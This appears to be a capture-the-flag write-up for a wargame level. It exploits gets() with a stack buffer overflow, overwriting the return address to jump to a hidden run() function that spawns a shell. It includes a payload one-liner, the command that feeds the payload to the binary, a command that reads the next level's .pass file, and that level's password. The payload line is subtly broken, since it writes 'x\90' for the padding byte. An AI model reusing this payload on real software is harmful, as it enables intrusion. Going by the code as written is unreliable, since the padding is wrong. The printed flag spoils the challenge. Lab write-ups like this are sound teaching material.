Here when we run gdb on the program we see there is a function called run().
This function is never called. When we disas it we see it runs a shell.
Our goal here will be to call this function.

Here we'll use the buffer overflow

We are going to exploit the gets() function.
We're going to write more than the size of the buffer to go up in the stack
to reach the return address. We modify it to exec the 'run' function instead.

Stack:
0      72                  76             80
|Buffer|Saved Frame Pointer|Return Address| ...

We write 72 char for the buffer size + 4 char of spf (saved pointer frame)

Payload:
0                76                    80
|NOP instructions|Custom Return Address| ...

python -c 'print "x\90"*76+ "\x08\x04\x84\x44"[::-1]' > /tmp/exploit

cat /tmp/exploit - | ./level1

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
